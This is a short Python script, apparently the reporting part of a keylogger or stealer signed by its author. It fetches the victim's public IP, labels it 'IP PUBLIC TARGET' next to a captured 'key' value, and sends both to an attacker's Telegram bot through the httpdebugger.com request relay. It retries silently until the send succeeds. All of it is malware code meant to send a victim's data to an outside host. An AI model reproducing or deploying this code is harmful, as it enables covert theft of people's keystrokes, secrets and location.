# -*- coding: utf-8 -*-
import requests
token = ''
Id = ''
def send(key):
    while True:
       try: 
           y = requests.get('http://ip.42.pl/raw')
        
           IP = f'''
            🩸 IP PUBLIC TARGET: {y.text}
        
            💌 key Terminal : {key}
        
            ➕➖➖➖➖➖➖➖➖➖➕
            🎃 CoDeD by:@E_L_F_6_6_6'''


           url_1 =(f"https://api.telegram.org/bot{token}/SendMessage?chat_id={Id}&text="+str(IP))
           paylod1={"UrlBox":url_1, 
                     "AgentList":"mozilla Firefox", 
                     "VersionsList":" HTTP/1.1", 
                     "MethodList":"post"}

           req2 =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", paylod1)
           break
       except:
           pass